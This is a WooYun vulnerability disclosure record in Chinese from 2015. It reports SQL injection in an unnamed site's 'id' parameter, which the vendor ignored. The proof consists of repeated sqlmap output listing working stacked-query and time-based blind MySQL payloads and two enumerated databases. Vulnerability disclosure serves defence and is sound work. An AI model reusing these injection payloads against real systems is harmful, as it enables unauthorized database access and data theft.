wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-09-08：	细节已通知厂商并且等待厂商处理中									2015-09-13：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 哦！妹子，这种相遇你不觉是种缘分吗？ 详细说明：  

   漏洞证明：  sqlmap identified the following injection points with a total of 129 HTTP(s) requests:---Parameter: id (GET)    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: id=12202;(SELECT * FROM (SELECT(SLEEP(5)))kxhc)#    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: id=12202 AND (SELECT * FROM (SELECT(SLEEP(5)))fuwD)---web application technology: Nginxback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: id=12202;(SELECT * FROM (SELECT(SLEEP(5)))kxhc)#    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: id=12202 AND (SELECT * FROM (SELECT(SLEEP(5)))fuwD)---web application technology: Nginxback-end DBMS: MySQL >= 5.0.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: id=12202;(SELECT * FROM (SELECT(SLEEP(5)))kxhc)#    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: id=12202 AND (SELECT * FROM (SELECT(SLEEP(5)))fuwD)---web application technology: Nginxback-end DBMS: MySQL >= 5.0.0available databases [2]:[*] information_schema[*] v_online   修复方案：  过滤   版权声明：转载请注明来源 小川@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-13 14:38 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无
